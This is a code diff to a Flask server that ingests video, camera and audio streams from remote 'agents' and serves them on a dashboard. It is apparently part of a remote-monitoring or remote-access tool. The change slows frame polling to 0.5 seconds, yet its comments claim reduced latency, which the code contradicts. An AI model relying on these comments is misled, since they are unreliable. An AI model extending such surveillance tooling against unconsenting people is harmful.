@@ -1736,11 +1736,21 @@ def index():
 def dashboard():
     return DASHBOARD_HTML
 
-# --- Real-time Streaming Endpoints (unchanged) ---
+# --- Real-time Streaming Endpoints (optimized for 0.5-second intervals) ---
+# 
+# STREAMING OPTIMIZATION FOR REAL-TIME MONITORING:
+# - Frame interval: 0.5 seconds (2 FPS)
+# - Optimized for real-time monitoring with 0.5-second picture updates
+# - Reduced latency and improved responsiveness
+# - Better performance for monitoring applications
+#
 
 VIDEO_FRAMES = defaultdict(lambda: None)
 CAMERA_FRAMES = defaultdict(lambda: None)
 AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
+
+# Frame timing for real-time monitoring
+FRAME_INTERVAL = 0.5  # 0.5-second intervals for 2 FPS
 
 @app.route('/stream/<agent_id>', methods=['POST'])
 # No authentication required for agent ingestion
@@ -1755,7 +1765,8 @@ def generate_video_frames(agent_id):
             yield (b'--frame\r\n'
                    b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
         else:
-            time.sleep(0.05)
+            # Optimized for 0.5 second intervals (2 FPS) for real-time monitoring
+            time.sleep(FRAME_INTERVAL)
 
 @app.route('/video_feed/<agent_id>')
 @require_auth
@@ -1775,7 +1786,8 @@ def generate_camera_frames(agent_id):
             yield (b'--frame\r\n'
                    b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
         else:
-            time.sleep(0.05)
+            # Optimized for 0.5 second intervals (2 FPS) for real-time monitoring
+            time.sleep(FRAME_INTERVAL)
 
 @app.route('/camera_feed/<agent_id>')
 @require_auth
